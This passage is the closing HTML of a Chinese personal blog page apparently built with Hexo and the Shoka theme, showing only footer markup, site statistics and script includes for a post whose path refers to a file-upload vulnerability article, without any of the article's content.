title="保护模式-阶段测试">保护模式-阶段测试</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Or0kit @ Or0kit</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">1.5m 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">22:29</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"PenetrationTest/Web-Security/web漏洞-文件上传/",favicon:{show:"╰(*°▽°*)╯正在变强中",hide:"(ー`′ー)快回来"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{scale:1,hHeadPos:.5,vHeadPos:.618,jsonPath:"/live2dw/assets/koharu.model.json"},display:{superSample:2,width:150,height:300,position:"right",hOffset:0,vOffset:-20},mobile:{show:!0,scale:.5},react:{opacityDefault:.7,opacityOnHover:.8},log:!1})</script></body></html><!-- rebuild by hrmmi -->